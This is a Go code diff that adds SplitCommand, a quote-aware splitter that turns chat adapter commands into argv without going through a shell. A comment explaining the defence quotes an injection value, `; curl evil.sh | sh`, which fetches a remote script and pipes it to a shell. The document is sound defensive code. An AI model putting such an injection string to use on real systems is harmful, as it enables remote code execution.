@@ -5,6 +5,7 @@ import (
 	"os"
 	"path/filepath"
 	"sort"
+	"strings"
 )
 
 // AdaptersDir is Dir()/adapters: where adapters live on disk.
@@ -97,29 +98,53 @@ func SeedChatAdapters(bundled map[string][]byte) (SeedResult, error) {
 	return res, nil
 }
 
-// ResolveChatScript turns a [[chat.adapters]] script value into a path.
+// SplitCommand splits an adapter's command into argv, the way a person writes
+// it and NOT the way a shell would read it.
 //
-// A path -- anything with a separator, or any existing file -- always wins, so
-// a local copy shadows a bundled adapter of the same name rather than fighting
-// it. A bare name resolves inside the chat adapters directory. The returned
-// path may not exist; the caller reports that, because "telegram.js is not
-// there" is a better error than "could not resolve".
-func ResolveChatScript(script string) (string, error) {
-	if script == "" {
-		return "", fmt.Errorf("adapter has no script")
+// Spaces separate, and single or double quotes group -- enough for `node
+// my adapter.js` or `python3 -c "import x"`. There is deliberately no
+// expansion, no pipe, no redirection and no command substitution: the command
+// is executed directly, so a config file cannot smuggle `; curl evil.sh | sh`
+// into a process that runs as the owner.
+func SplitCommand(cmd string) ([]string, error) {
+	var argv []string
+	var cur strings.Builder
+	var quote rune
+	started := false
+
+	flush := func() {
+		if started {
+			argv = append(argv, cur.String())
+			cur.Reset()
+			started = false
+		}
 	}
-	if filepath.IsAbs(script) || filepath.Dir(script) != "." {
-		return expandHome(script), nil
+	for _, r := range cmd {
+		switch {
+		case quote != 0:
+			if r == quote {
+				quote = 0
+			} else {
+				cur.WriteRune(r)
+			}
+		case r == '\'' || r == '"':
+			quote = r
+			started = true // "" is a real, empty argument
+		case r == ' ' || r == '\t':
+			flush()
+		default:
+			cur.WriteRune(r)
+			started = true
+		}
 	}
-	dir, err := ChatAdaptersDir()
-	if err != nil {
-		return "", err
+	if quote != 0 {
+		return nil, fmt.Errorf("unterminated %c quote in command", quote)
 	}
-	name := script
-	if filepath.Ext(name) == "" {
-		name += ".js"
+	flush()
+	if len(argv) == 0 {
+		return nil, fmt.Errorf("adapter has no command")
 	}
-	return filepath.Join(dir, name), nil
+	return argv, nil
 }
 
 // expandHome turns a leading ~ into the home directory, because a config file
